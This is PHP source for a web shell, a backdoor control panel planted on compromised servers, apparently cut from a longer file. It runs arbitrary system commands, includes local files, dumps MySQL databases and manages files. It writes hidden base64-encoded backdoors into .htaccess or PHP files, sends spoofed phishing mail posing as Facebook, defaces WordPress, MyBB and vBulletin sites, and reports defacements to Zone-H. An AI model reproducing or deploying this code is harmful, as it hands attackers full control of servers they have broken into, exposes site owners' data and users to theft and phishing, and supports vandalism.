<div style="color:#00ff00">
<form action="?action=mysql&main=2" method="post">
host <input type="text" name="host" value="localhost"><br/>
user <input type="text" name="user" value="root"><br/>
pass <input type="text" name="pass"><br/>
<input type="submit" value="ִ��">
</form></div>
<?php
}

if(isset($_GET['action']) && $_GET['action'] == 'mysql' && !empty($_GET['main']) && $_GET['main'] == 2){
$host = $_POST['host'];
$user = $_POST['user'];
$pass = $_POST['pass'];
mysql_connect($host, $user, $pass) or die('Not connected!');

$query = mysql_query('SHOW DATABASES');

echo '<div style="color:#00ff00"><center><h2>Database</h2><form action="" method="get"><select name="db">';
						while($rows=mysql_fetch_array($query)){
							for($j=0;$j<mysql_num_fields($query);$j++)
							{

								if($rows[$j] == "") $dataz = " ";
								else $dataz = $rows[$j];
								$result .= '<option>'.htmlspecialchars($dataz).'</option>';
							}
						}
echo $result;	
echo '</select><br/><input type="hidden" value="'.$host.'" name="host"><input type="hidden" value="'.$user.'" name="user"><input type="hidden" value="'.$pass.'" name="pass"><input type="hidden" value="3" name="main"><input type="submit" value="ִ��"></form></center></div>';
mysql_close();
}

if(isset($_GET['db']) && !empty($_GET['main']) && $_GET['main'] == 3){
$host = $_GET['host'];
$user = $_GET['user'];
$pass = $_GET['pass'];
mysql_connect($host, $user, $pass) or die('Not connected!');


$db = $_GET['db'];
$sql = "SHOW TABLES FROM ".$db;
$result = mysql_query($sql);
while ($row = mysql_fetch_row($result)) {
    echo '<a href="?action=mysql&main=4&db='.$db.'&host='.$host.'&user='.$user.'&pass='.$pass.'&table='.$row[0].'" id="table">&nbsp;&nbsp;'.$row[0].'&nbsp;&nbsp;</a>';
}
mysql_free_result($result);

mysql_close();
}

if(isset($_GET['db']) && !empty($_GET['main']) && $_GET['main'] == 4 && empty($_GET['column']) && !empty($_GET['table'])){
$host = $_GET['host'];
$user = $_GET['user'];
$pass = $_GET['pass'];
mysql_connect($host, $user, $pass) or die('Not connected!');
mysql_select_db($_GET['db']) or die('Unable to select db');

$query = mysql_query("SHOW COLUMNS FROM ".$_GET['table']);
while ($row = mysql_fetch_row($query)) {
    echo '<a href="?action=mysql&main=5&db='.$_GET['db'].'&host='.$host.'&user='.$user.'&pass='.$pass.'&table='.$_GET['table'].'&column='.$row[0].'" id="table">&nbsp;&nbsp;'.$row[0].'&nbsp;&nbsp;</a>';
}
mysql_free_result($query);
mysql_close();
}

if(isset($_GET['db']) && !empty($_GET['main']) && $_GET['main'] == 5 && !empty($_GET['column'])){
$host = $_GET['host'];
$user = $_GET['user'];
$pass = $_GET['pass'];
mysql_connect($host, $user, $pass) or die('Not connected!');
mysql_select_db($_GET['db']) or die('Unable to select db');

$query = mysql_query("SELECT ".$_GET['column']." FROM ".$_GET['table']);
echo "<textarea id=\"table\" style=\"width:100%;height:100%\">";
while($row = mysql_fetch_array($query)){
echo htmlspecialchars($row[$_GET['column']])."\n\n-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n\n";
}
echo "</textarea><br/><br/>	";
}

// tools
if(isset($_GET['action']) && $_GET['action'] == 'zone-h' && !empty($_POST['hackmode'])){
if($_POST['SendNowToZoneH'])
{
	echo '<center>';
	ob_start();
	$sub = get_loaded_extensions();
	if(!in_array("curl", $sub)){die('[-] Curl Is Not Supported !! ');}
	$hacker = $_POST['defacer'];
	$method = $_POST['hackmode'];
	$neden = $_POST['reason'];
	$site = $_POST['domain'];
	
	if (empty($hacker)){die ("[-] You Must Fill the Attacker name !");}
	elseif($method == "--------SELECT--------") {die("[-] You Must Select The Method !");}
	elseif($neden == "--------SELECT--------") {die("[-] You Must Select The Reason");}
	elseif(empty($site)) {die("[-] You Must Inter the Sites List ! ");}
	$i = 0;
	$sites = explode("\n", $site);
	while($i < count($sites)) 
	{
		if(substr($sites[$i], 0, 4) != "http") {$sites[$i] = "http://".$sites[$i];}
		ZoneH("http://zone-h.org/notify/single", $hacker, $method, $neden, $sites[$i]);
		echo "Site : ".$sites[$i]." Defaced !\n";
		++$i;
	}
	echo "[+] Sending Sites To Zone-H Has Been Completed Successfully !! ";
}
	echo '</center>';
}

if(isset($_GET['action']) && $_GET['action'] == 'zone-h'){
?>
<center>
<!-- Zone-H -->
<form action="" method='POST'><table><tr>
<td style='background-color:#666;padding-left:10px;'><h2 style="color:#00cc00"><center>Zone-H ��ҳ�ύ</center></h2></td></tr><tr><td height='45' colspan='2'><form method="post">
<input type="text" name="defacer" value="yulu" />
<select name="hackmode">
<option >--------ѡ��--------</option>
<option value="1">known vulnerability (i.e. unpatched system)</option>
<option value="2" >undisclosed (new) vulnerability</option>
<option value="3" >configuration / admin. mistake</option>
<option value="4" >brute force attack</option>
<option value="5" >social engineering</option>
<option value="6" >Web Server intrusion</option>
<option value="7" >Web Server external module intrusion</option>
<option value="8" >Mail Server intrusion</option>
<option value="9" >FTP Server intrusion</option>
<option value="10" >SSH Server intrusion</option>
<option value="11" >Telnet Server intrusion</option>
<option value="12" >RPC Server intrusion</option>
<option value="13" >Shares misconfiguration</option>
<option value="14" >Other Server intrusion</option>
<option value="15" >SQL Injection</option>
<option value="16" >URL Poisoning</option>
<option value="17" >File Inclusion</option>
<option value="18" >Other Web Application bug</option>
<option value="19" >Remote administrative panel access bruteforcing</option>
<option value="20" >Remote administrative panel access password guessing</option>
<option value="21" >Remote administrative panel access social engineering</option>
<option value="22" >Attack against administrator(password stealing/sniffing)</option>
<option value="23" >Access credentials through Man In the Middle attack</option>
<option value="24" >Remote service password guessing</option>
<option value="25" >Remote service password bruteforce</option>
<option value="26" >Rerouting after attacking the Firewall</option>
<option value="27" >Rerouting after attacking the Router</option>
<option value="28" >DNS attack through social engineering</option>
<option value="29" >DNS attack through cache poisoning</option>
<option value="30" >Not available</option>
</select>

<select name="reason">
<option >--------ѡ��--------</option>
<option value="1" >Heh...just for fun!</option>
<option value="2" >Revenge against that website</option>
<option value="3" >Political reasons</option>
<option value="4" >As a challenge</option>
<option value="5" >I just want to be the best defacer</option>
<option value="6" >Patriotism</option>
<option value="7" >Not available</option>
</select>
<input type="hidden" name="action" value="zone-h">
<center><textarea style="background:green;outline:none;" name="domain" cols="44" rows="9" id="domains"></textarea>
<br /><input type="submit" value="�ύ��ҳ !" name="SendNowToZoneH" /></center>
</form></td></tr></table></form>
<!-- End Of Zone-H -->
</td></center>
<?php
}

if(isset($_GET['action']) && $_GET['action'] == 'tools'){
?>
<div id="commands">
<div style="float:right">
<center>
<h2>Cloudflare</h2>
Ip finder ./x-h4ck
<form action="" method="post">
<input type="text" value="exploit-db.com" name="site"><input type="submit" name="submit" value="ִ��">
</form>
<h2>CMS Fack</h2>
<span style="font-family:arial;font-size:10px;color:white">wp/mybb/vb<br/>
<form action="" method="post">
<textarea name="index" style="width:220px;height:100px;color: #00ff00;background-color:#002d00;">Some deface shit in here :P</textarea><br/>
<input type="text" value="host" name="host" style="border-bottom:none"><br/><input type="text" name="user" value="user" style="border-bottom:none"><br/><input type="text" name="pass" value="pass" style="border-bottom:none"><br/><input type="text" name="db" value="database" style="border-bottom:none"><br/><input type="text" name="tab" value="table prefix"><br/>
<input type="radio" name="cat" value="wp">wp<input type="radio" name="cat" value="mybb">mybb<input type="radio" name="cat" value="vb">vb<br/>
<span style="font-family:arial;font-size:10px;color:white">vb = update faq, calendar, search<br />wp = update wordpress posts<br/>mybb = update mybb index<br/>
<input type="submit" value="ִ��">
</form><br />
<?php
if(isset($_GET['folder'])){
$chemin=$_GET['folder'];

$files = glob("$chemin*");

echo "Trying To List Folder <font color=#000099><b>$chemin</b></font><br/>";

foreach ($files as $filename) {

	echo "<pre>";

   echo "$filename\n";

   echo "</pre>";

}
}
else{ ?>
<h2 style="color:#00cc00;font-size:21px">List Directory</h2>
<form action="" method="get">
<input type="text" name="folder" value="/etc/passwd/">
<input type="submit" value="ִ��">
<input type="hidden" name="action" value="tools">
</form>
<?php }
if(isset($_GET['hex'])){
echo '<br /><br /><font color="#00ff00"><b>0x'.bin2hex($_GET['hex']).'</b></font>';
}
else{ ?>
<h2 style="color:#00cc00;font-size:21px">Text 2 Hex</h2>
<form action="" method="get">
<input type="text" name="hex" value="abcd">
<input type="submit" value="ִ��">
<input type="hidden" name="action" value="tools">
</form>
<?php }
?>
<?php
if(isset($_GET['lfi'])){
include($_GET['lfi']);
}
else{ ?>
<h2 style="color:#00cc00;font-size:21px">LFI Dude</h2>
<form action="" method="get">
<input type="text" name="lfi" value="../../../../../proc/sef/environ">
<input type="submit" value="ִ��">
<input type="hidden" name="action" value="tools">
</form>
<?php }
?>
</center>
</div>
<div>
<h2>Mail sender</h2>
<form action="" method="post">
<font color="#00ff00"><b>Subject:</b></font><br/><input type="text" name="subjekti" value="change your password"><br/>
<font color="#00ff00"><b>From:<br/></font><input type="text" name="email" value="admin@facebook.com"><br/>
<font color="#00ff00"><b>To:<br/></font><input type="text" name="to" value="@"><br/>
<font color="#00ff00"><b>Body:<br/></font><textarea style="width:220px;height:100px;color: #00ff00;background-color:#002d00;" name="arsyeja">We made some changes recent days and..</textarea><br/>
<font color="#00ff00"><b>Times:<br/></font><input type="text" name="times" value="1" style="width:30px">
<input type="submit" name="submit" value="send spam">
</form>
</div>
<?php
if(isset($_GET['cook'])){
$a = fopen("oncha.php", "w");
fputs($a, $o);
fclose($a);
}

if(isset($_GET['s-option'])){
$op = $_GET['s-option'];
if($op == ".htaccess"){
$o = stripslashes(base64_decode("IyBPdmVycmlkZSBkZWZhdWx0IGRlbnkgcnVsZSB0byBtYWtlIC5odGFjY2VzcyBmaWxlIGFjY2Vzc2libGUgb3ZlciB3ZWINCjxGaWxlcyB+IFwiXlxcLmh0XCI+DQpPcmRlciBhbGxvdyxkZW55DQpBbGxvdyBmcm9tIGFsbA0KPC9GaWxlcz4NCkFkZFR5cGUgYXBwbGljYXRpb24veC1odHRwZC1waHAgLmh0YWNjZXNzDQoNCiMjIyMjIyBTSEVMTCAjIyMjIyMgPD9waHAgZWNobyBcIlxcblwiO3Bhc3N0aHJ1KCRfR0VUW1wnY1wnXS5cIiAyPiYxXCIpOyA/PiMjIyMjIyBMTEVIUyAjIyMjIyM="));
$a = fopen(".htaccess", "w");
fputs($a, $o);
fclose($a);
echo 'Visit <a href="http://'.$_SERVER['HTTP_HOST'].'/.htaccess?c=">'.$_SERVER['HTTP_HOST'].'/.htaccess?c=</a>';
}
else{
$o = stripslashes(base64_decode("PD9waHAgc3lzdGVtKCRfR0VUW1wnY1wnXSk7ID8+"));
$a = fopen("dfgdfg.php", "w");
fputs($a, $o);
fclose($a);
echo 'Visit <a href="'.$_SERVER['HTTP_HOST'].'/dfgdfg.php?c=">'.$_SERVER['HTTP_HOST'].'/dfgdfg.php?c=</a>';
}
}
else{ ?>
<div>
<form action="" method="get">
<h2>Hide Shell</h2>
<select name="s-option">
<option>.htaccess</option>
<option>.php</option>
</select>
<input type="hidden" name="action" value="tools">
<input type="submit" value="ִ��">
</form>
</div>
<?php }
if(isset($_GET['fp'])){
$filepath = $_GET['fp'];
$sitepath = $_GET['sp'];
$writeblefilepath = 'myfile.txt';
$flib=$sitepath.$writeblefilepath;
@unlink($flib);
symlink($filepath, $flib);
echo readlink($flib)."\n";
echo "<textarea cols=30 rows=10>".file_get_contents("http://".$_SERVER['HTTP_HOST']."/".$writeblefilepath)."</textarea>";
@unlink($flib); 
}
else{ ?>
<div>
<h2>Symlink #2</h2>
<a href="?action=symlink">__First tool</a><br />
File path:<br />
<form action="" method="get">
<input type="text" name="fp" value="/home/xx/public_html/xx.xx"><br />
Site path:<br />
<input type="text" name="sp" value="/home/xx/public_html/"><br />
<input type="hidden" name="action" value="tools">
<input type="submit" value="ִ��" style="border-top:0"><br />
</form>
</div>
<?php } ?>

</div>
<textarea id="source">
<?php
if(isset($_POST['site'])){
/* FAK CLOUDFLARE, pirate.al, flashcrew.in, devilzc0de.org h4x0rs.net  */
$fuckcloud = dns_get_record($_POST['site'], DNS_TXT);
print_r($fuckcloud);

}

if(isset($_POST['subjekti'])){

$subject = $_POST['subjekti'];
$email = $_POST['email'];
$to = $_POST['to'];
$comments = $_POST['arsyeja'];
$times = $_POST['times'];
for($i=0;$i<$times;$i++){
if(mail("$to", "$subject", "$comments", "From: $email")){
    echo "  Sent.";
}
else{
echo "  Not sent!";
}}}

if(isset($_POST['index'])){
$index = mysql_real_escape_string($_POST['index']);
$host = $_POST['host'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$db = $_POST['db'];
$tab = $_POST['tab'];

mysql_connect($host, $user, $pass);
mysql_select_db($db);

$cat = $_POST['cat'];
if($cat == 'wp'){
mysql_query("UPDATE ".$tab."posts SET post_title='".$index."'");
echo 'All posts updated :)';
}
if($cat == 'mybb'){
mysql_query("UPDATE ".$tab."templates SET template='".$index."'");
echo 'Index f@cked :)';
}
if($cat == 'vb'){
mysql_query("UPDATE ".$tab."template SET template ='".$index."' WHERE title ='faq'");
echo 'faq f@cked :)';
mysql_query("UPDATE ".$tab."template SET template ='".$index."' WHERE title ='calendar'");
echo 'calendar f@cked :)';
mysql_query("UPDATE ".$tab."template SET template ='".$index."' WHERE title ='search'");
echo 'search f@cked :)';
}

}

echo '</textarea>';
}
?>
<?php

if(isset($_GET['action']) && $_GET['action'] == 'files'){
?>
<div id="box"><br/>

<form action="" method="get">
<font color="#00ff00"><b>&nbsp;&nbsp;&nbsp;&nbsp;����Ŀ¼</b></font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" value="<?php if(empty($_GET['go'])){echo getcwd();}else{echo $_GET['go'];} ?>" name="go">
<input type="hidden" name="action" value="files">
<input type="submit" value="ִ��">
</form><br/>
<form action="" method="get">
<font color="#00ff00"><b>&nbsp;&nbsp;&nbsp;&nbsp;����Ŀ¼</b></font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" value="name" name="newdir">
<input type="hidden" name="go" value="<?php echo getcwd(); ?>">
<input type="hidden" name="action" value="files">
<input type="submit" value="ִ��">
</form><br/>
<?php
// delete
if(isset($_GET['delete']) && !empty($_GET['action']) && $_GET['action'] == 'files'){
$file = $_GET['delete'];
// if exist
if(is_dir($file) || file_exists($file)){
// if file del
if(!is_dir($file)){
unlink($file);
echo '<font color="green">File deleted</font><br/>';
}
if(is_dir($file)){
function rmdirs($d) {
	$f = glob($d . '*', GLOB_MARK);
	foreach($f as $z){
		if(is_dir($z)) rmdirs($z);
		else unlink($z);
	}
	if(is_dir($d)) rmdir($d);
}
rmdirs($file);
echo '<font color="green">Folder deleted</font><br/>';
}

}
else{
echo '<font color="red">File or folder does not exist</font><br/>';
}

}

// rename
if(isset($_GET['old_name']) && !empty($_GET['rename_file']) && !empty($_GET['action']) && $_GET['action'] == 'files'){
$old = $_GET['old_name'];
$new = $_GET['rename_file'];
// if new file or folder exist
if(is_dir($new) || file_exists($new)){
echo '&nbsp;&nbsp;&nbsp;&nbsp;<font color="red">File or folder exists.</font> <a href="?delete='.$new.'&action=files">delete</a><br/>';
}
else{
// if file or folder exist
if(is_dir($old) || file_exists($old)){
if(rename($old, $new)){
if(is_dir($old)){
echo "<font color=\"green\">Folder renamed sucsessfuly to ".$new."</font>, <a href=\"?view=".$new."\">open</a>";
}
if(!is_dir($old)){
echo "<font color=\"green\">File renamed sucsessfuly to ".$new."</font>, <a href=\"?view=".$new."\">open</a><br/>";
}
}
else{
echo "<font color=\"red\">Problem renaming ".$old."</font><br/>";
}
}
else{
echo '&nbsp;&nbsp;&nbsp;&nbsp;<font color="red">File or folder not found.</font><br/>';
}
}

}

if(isset($_GET['rename']) && !empty($_GET['action']) && $_GET['action'] == 'files'){
$file = $_GET['rename'];
?>
<form action="" method="get">
Old Name: <input name="old_name" type="text" value="<?php echo $file; ?>"><br/>
Rename to: <input name="rename_file" type="text" value="<?php echo $file; ?>"><br/>
<input type="hidden" name="action" value="files">
<input type="submit" value="ִ��">
</form>
<?php
}
// new dir
if(isset($_GET['go']) && !empty($_GET['newdir']) && !empty($_GET['action']) && $_GET['action'] == 'files'){
$dir = $_GET['go'];
$new = $_GET['newdir'];
$currect = getcwd();
// if dir is dir
if(is_dir($dir)){
// if dir exist
if(is_dir($new)){
echo '&nbsp;&nbsp;&nbsp;&nbsp;<font color="red">Directory exist.</font> <a href="?del_dir='.$currect.'\\'.$new.'&action=files">delete</a><br/>';
}
else{
if(mkdir($new)){
echo '&nbsp;&nbsp;&nbsp;&nbsp;<font color="green">Directory created</font><br/>';
}
else{
echo '&nbsp;&nbsp;&nbsp;&nbsp;<font color="red">Problem creating directory</font><br/>';
}
if(!is_dir($dir)){
chdir($go);
if(mkdir($new)){
echo '&nbsp;&nbsp;&nbsp;&nbsp;<font color="green">Directory created</font><br/>';
}
else{
echo '&nbsp;&nbsp;&nbsp;&nbsp;<font color="red">Problem creating directory</font><br/>';
}
}

}
}
}

// file browser
$self = $_SERVER['PHP_SELF'];
$dir = getcwd();
    if(isset($_GET['go']))
    {
        $dir = $_GET['go'];
    }
	
	if(is_dir($dir))
    {
        $handle = opendir($dir);
        {
		
				showDrives();
				?>
				<br/>
				&nbsp;&nbsp;&nbsp;&nbsp;&#171;<a style="color:red" href="<?php echo $_SERVER['PHP_SELF'].'?action=files&go='.getcwd(); ?>/../">����</a>&nbsp;&nbsp;&nbsp;&nbsp;
				<a style="color:red" href="<?php echo $_SERVER['HTTP_REFERER']; ?>">&nbsp;&nbsp;&nbsp;&nbsp;ǰ��</a>&nbsp;&nbsp;&#187;<br/>
				<?php
        if($dir[(strlen($dir)-1)] != '/'){$dir = $dir.'/';}
        while (($file = readdir($handle)) != false) {
                if ($file != "." && $file != "..")
        	{
		
		$color = 'red';
		if(is_readable($dir.$file))
		{
			$color = 'yellow';
		}
		if(is_writable($dir.$file))
		{
			$color = '#00ff00';
		}
                if(is_dir($dir.$file))
                {
                    ?>
					<span id="onmouseover">
					<a  style="font-size:12px;font-family:sans-serif;color: <?php echo $color?>;" href="<?php echo $self ?>?go=<?php echo $dir.$file ?>&action=files"><b>[ <font color="pink"><?php echo $file ?></font> ]</b></a>
                    <?php echo HumanReadableFilesize(dirSize($dir.$file));?>
                    <font color="pink"><?php echo getFilePermissions($dir.$file);?></font> <font color="#666">> </font><?php echo getperms($dir); ?>
                    <a id="za" style="margin-right:30px" href="<?php echo $self;?>?delete=<?php echo $dir.$file;?>&action=files">Delete</a>
                    <a id="za" style="margin-right:10px" href="<?php echo $self;?>?action=files&rename=<?php echo $dir.$file;?>">Rename</a>
	            <a id="za" style="margin-right:10px" href="<?php echo $self;?>?zip=<?php echo $dir.$file;?>&action=files">Download</a>
                    <a id="za" style="margin-right:25px" href="<?php echo $self;?>?action=upload&path=<?php echo $dir.$file;?>">Upload</a><br/>
					</span>
                <?php
                }
                //Its a file 
                else
                {
                    ?>
					<span id="onmouseover">
					<a style="font-family: Optima, Segoe, "Segoe UI", Candara, Calibri, Arial, sans-serif;color: <?php echo $color?>;" href='<?php echo $self ?>?view=<?php echo $dir.$file ?>'><?php echo $file ?></a>
                    <font color="orange"><?php echo HumanReadableFilesize(filesize($dir.$file));?></font>
                    <font color="yellow"><?php echo getFilePermissions($dir.$file);?></font> <font color="#666">> </font><?php echo getperms($dir.$file); ?>
                    <a id="za" style="margin-right:30px" href="<?php echo $self;?>?delete=<?php echo $dir.$file;?>&action=files">Delete</a>
                    <a id="za" style="margin-right:10px" href="<?php echo $self;?>?action=files&rename=<?php echo $dir.$file;?>">Rename</a>
	            <a id="za" style="margin-right:10px" href="<?php echo $self;?>?zip=<?php echo $dir.$file;?>">Download</a><br/>
                    </span>
					<?php
                }
            }
        }
        closedir($handle);
        }
    }
    else
    {
        echo "<p class='alert_red' id='margins'>Permission Denied</p>";
    }


?>
</div>
<?php
}
?>
<br/><br/>
<?php
if(!isset($_GET['action']) && !isset($_GET['upload']) && !isset($_GET['get']) && !isset($_GET['turnoff']) && !isset($_GET['view']) && !isset($_GET['db'])){
?>
<div id="commands">
<form action="" method="get">
<font color="#00ff00"><b>ִ������</b></font> <input type="text" name="command" value="ls -la">
<input type="submit" value="ִ��">
</form><br/>
<form action="" method="get">
<font color="#00ff00"><b>Ԥ������</b></font> 
<select name="command">
  <option>whoami</option>
  <option>netstat -an</option>
  <option>ls -la</option>
  <option>ls</option>
  <option>uname -a</option>
  <option>dir</option>
  <option>start cmd.exe</option>
  <option>cat /etc/passwd</option>
  <option>cat /etc/hosts</option>
</select>
<input type="submit" value="ִ��">
</form><br/>
<form action="" method="get">
<font color="#00ff00"><b>�����ļ� &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp;&nbsp;</b></font> <input type="text" id="move" name="make">
<input type="submit" value="ִ��">
</form><br/>
<form action="" method="get">
<font color="#00ff00"><b>�ļ�Ȩ�� &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp;&nbsp;</b></font> <input type="text" name="thefile" value="File Name" style="width:110px">
<input type="text" name="thefileval" value="0777" style="width:44px">
<input type="submit" value="ִ��"> <span style="color: #00ff00;font-family: Tahoma, Geneva, sans-serif;font-size:12px;"> ~~~~ </span>
<select name="comm">
<option>chmod</option>
<option>chown</option>
<option>chgrp</option>
</select>
</form><br/>
<form action="" method="get">
<font color="#00ff00"><b>Passthru &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</b></font> <input type="text" name="thepass" value="whoami">
<input type="submit" value="ִ��">
</form><br/>
<form action="" method="get">
<font color="#00ff00"><b>Exec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</b></font> <input type="text" name="theexec" value="whoami">
<input type="submit" value="ִ��">
</form><br/>
<form action="" method="get">
<font color="#00ff00"><b>Popen&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</b></font> <input type="text" name="popen" value="start cmd.exe">
<input type="submit" value="ִ��">
</form><br/>

<?php
}

if(isset($_GET['thepass'])){
echo '<textarea id="sourcea">';
passthru($_GET['thepass']);
echo '</textarea>';
}
if(isset($_GET['theexec'])){
echo '<textarea id="sourcea">';
if(!function_exists('exec')){
die('Exec command is blocked blocked by admin');
}
else{
echo exec($_GET['theexec']);
echo '</textarea>';
}
}
if(isset($_GET['popen'])){
echo '<textarea id="sourcea">';
if(!function_exists('popen')){
die('Popen command is blocked blocked by admin');
}
else{
popen($_GET['popen'], "r");
echo '</textarea>';
}
}

if(isset($_GET['thefile'])){
$file = $_GET['thefile'];
$new = $_GET['thefileval'];
		if($_GET['comm'] == 'chmod')
		{
			$ch_ok = chmod($file,$new);
			echo "Permission Changed.";
		}
		else if($_GET['comm'] == 'chown')
		{
			$ch_ok = chown($file,$new);
			echo "Owner Changed.";
		}
		else if($_GET['comm'] == 'chgrp')
		{
			$ch_ok = chgrp($file,$new);
			echo "Group Changed.";
		}
}


if(isset($_FILES['upload'])){
//file upload
    echo '<center>';
if(isset($_POST['location']) && !empty($_POST['location'])){
$target_path = $_POST['location'];
$target_path = $target_path.'/';
}
else{
$target_path = "";
}
echo "<font color=\"green\">File ".basename($_FILES["upload"]["name"])."</font> uploaded.<br/>";
if(move_uploaded_file($_FILES["upload"]["tmp_name"], $target_path . $_FILES["upload"]["name"])){
    echo "The file ".basename($_FILES["upload"]["name"]). 
    " has been uploaded";
} else{
    echo "There was an error uploading the file, please try again!";
}
    echo '</center>';
}

if(isset($_GET['dirmake'])){
// change directory
$dir = $_GET['dirmake'];
?><font color="#228B22">Command executed</font><br/> <font color="#00ff00">
<?php
echo '<b>Last dir:</b></font><font color="yellow"> '.getcwd() . "</font><br/>";

chdir($dir);

// current directory
echo '<b>New dir:</b></font><font color="yellow"> '.getcwd() . "</font><br/>";
?>
<?php
}

if(isset($_GET['command'])){
$command = $_GET['command'];
if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
if(preg_match("/ls/", $command)||preg_match("/cat/", $command)||preg_match("/grep/", $command)||preg_match("/wget/", $command)||preg_match("/apt-get/", $command)||preg_match("/install/", $command)||preg_match("/mkdir/", $command)){
    echo '<font color="#A52A2A"><b>This command dont work on windows!</b></font> ';
	}
}
if (strtoupper(substr(PHP_OS, 0, 3)) === 'UNI') {
if(preg_match("/ls/", $command)||preg_match("/tree/", $command)||preg_match("/cd../", $command)){
    echo '<font color="#A52A2A"><b>This command dont work on linux!</b></font> ';
	}
}
?>
<textarea id="sourcea">
<?php
system($command);
?>
</textarea></div>
<?php
}
?>
<?php
// ============================
// get action
// ============================
if(isset($_GET['action']) && !empty($_GET['action'])){
$action = $_GET['action'];
if($action == "phpinfo"){
phpinfo();
}

if($action == 'upload'){
    ?>
    <center>
<form action="" method="post" enctype="multipart/form-data">
<font color="#00ff00"><b>�ϴ��ļ�</b></font> <input type="file" name="upload"> <b>�ϴ���...</b> <input type="text" name="location" value="<?php if(isset($_GET['path'])){echo $_GET['path'];} ?>">
<input type="submit" value="ִ��">
</form><br/></center>
<?php
}

if($action == "kill"){
echo 'Do you really want to delete this shell ? &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ';
?>
<a style="padding: 5px;border:1px solid #00ff00;color:#00ff00;" href="?action=killit">Yes</a> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
<a style="padding: 5px;border:1px solid #00ff00;color:#00ff00;" href="<?php echo $_SERVER['PHP_SELF']; ?>">No</a>
<?php
}
if($action == "killit"){
$file = $_SERVER['PHP_SELF'];
$file = str_replace('/', '', $file);
unlink($file);
echo '<center><font color="#00ff00">Bitch u killed me o.O</font></center>';
header('refresh: 2; '.$_SERVER['PHP_SELF'].'');
}
if($action == "logout"){
unset($_SESSION['loggedin']);
echo '<center><font color="#00ff00">Logged out.</font></center>';
}


}

}
// ================================
// else login
else{
if(isset($_SESSION['banned'])){
if($_SESSION['banned'] == '3'){
die($about.'
</body>
</html>');
}
}
?>
<br/><br/><br/><br/><br/><br/><br/><br/><center><br/>
<form action="" method="post">
<input type="password" value="" name="pass" style="background:green"><br/><br/>
<input type="submit" value="Login">
</form>
</center>
<?php
}

if(isset($_POST['pass']) && !empty($_POST['pass'])){
$pass = $_POST['pass'];
if($pass > 50){
die("pass 2 long dud3");
}
if($pass != $password){
if(isset($_SESSION['banned'])){
if($_SESSION['banned'] == '1'){
$_SESSION['banned'] = '2';
die("Wrong password kid and +1 more attemp BANNED");
}
if($_SESSION['banned'] == '2'){
$_SESSION['banned'] = '3';
die("Wrong password kid and BANNED");
}
}
else{
$_SESSION['banned'] = '1';
}
}
else{
$_SESSION['loggedin'] = 'true';
echo "<center><b>Logged in kid</b> &nbsp;&nbsp;&nbsp; <p>redirecting..</p> <a href=\"#\">or click here</a></center>";
header('location: '.$_SERVER['PHP_SELF']);
}
}
?>
<span style="color: #00ff00;font-family: Tahoma, Geneva, sans-serif;font-size:12px;"><center>[<font color="red">+</font>] I hate defacing sites and shows no skills!<br />[<font color="red">+</font>] Read the EULA carefully<br />[<font color="red">+</font>] Im not rensponsable for any shit<br />[<font color="green">+</font>] H4CK3D BY YU1U<br />
<?php
if(!isset($_SESSION['loggedin'])){echo $about;}
if (strtoupper(substr(PHP_OS, 0, 3)) === 'UNI'){
echo "user = ".@get_current_user()." | uid= ".@getmyuid()." | gid= ".@getmygid();
} ?>
</center></span>
</body>
</html>